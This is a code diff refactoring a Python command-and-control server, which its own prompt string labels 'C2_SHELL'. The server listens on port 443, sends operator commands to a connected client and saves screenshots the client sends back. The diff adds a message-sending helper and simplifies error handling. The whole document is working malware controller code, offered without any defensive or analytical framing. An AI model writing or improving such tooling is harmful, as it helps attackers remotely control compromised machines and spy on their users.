@@ -6,26 +6,37 @@ import threading
 LISTEN_IP = "0.0.0.0"
 PORT = 443
 
-def receber_bytes_exatos(client_socket, tamanho_esperado):
+def enviar_mensagem(sock, payload):
+    if isinstance(payload, str):
+        payload = payload.encode('utf-8')
+    pacote = struct.pack(">I", len(payload)) + payload
+    sock.sendall(pacote)
+
+def receber_bytes_exatos(sock, tamanho_esperado):
     dados_acumulados = b""
     while len(dados_acumulados) < tamanho_esperado:
         bytes_restantes = tamanho_esperado - len(dados_acumulados)
-        pacote = client_socket.recv(bytes_restantes)
+        pacote = sock.recv(bytes_restantes)
         if not pacote:
-            raise ConnectionResetError("Conexão fechada pelo cliente.")
+            raise ConnectionResetError()
         dados_acumulados += pacote
     return dados_acumulados
 
-def ler_mensagem_do_protocolo(client_socket):
-    bytes_do_tamanho = receber_bytes_exatos(client_socket, 4)
-    tamanho_do_payload = struct.unpack(">I", bytes_do_tamanho)[0]
-    payload_bruto = receber_bytes_exatos(client_socket, tamanho_do_payload)
-    return payload_bruto
+def receber_mensagem(sock):
+    try:
+        bytes_do_tamanho = receber_bytes_exatos(sock, 4)
+        tamanho_do_payload = struct.unpack(">I", bytes_do_tamanho)[0]
+        return receber_bytes_exatos(sock, tamanho_do_payload)
+    except (ConnectionResetError, struct.error, socket.error):
+        return None
 
 def receive_handler(client_socket):
     while True:
         try:
-            payload = ler_mensagem_do_protocolo(client_socket)
+            payload = receber_mensagem(client_socket)
+            if payload is None:
+                print("\n[-] Conexão encerrada pelo cliente.\nC2_SHELL> ", end="", flush=True)
+                break
             
             if payload.startswith(b'\x89PNG\r\n\x1a\n'):
                 nome_arquivo = f"screenshot_{threading.get_ident()}.png"
@@ -38,14 +49,8 @@ def receive_handler(client_socket):
                 
         except socket.timeout:
             continue
-        except ConnectionResetError as e_reset:
-            print(f"\n[-] Conexão resetada: {e_reset}")
-            break
-        except struct.error as e_struct:
-            print(f"\n[!] Erro estrutural nos dados do cabeçalho: {e_struct}")
-            break
-        except OSError as e_os:
-            print(f"\n[-] Erro de E/S no socket: {e_os}")
+        except OSError:
+            print("\n[-] Erro de E/S no socket.")
             break
 
 def start_server():
@@ -75,8 +80,7 @@ def start_server():
                 if not command:
                     continue
                     
-                cabecalho = struct.pack(">I", len(command.encode("utf-8")))
-                client_socket.sendall(cabecalho + command.encode("utf-8"))
+                enviar_mensagem(client_socket, command)
                 
                 if command == "/exit":
                     print("[*] Closing connection.")
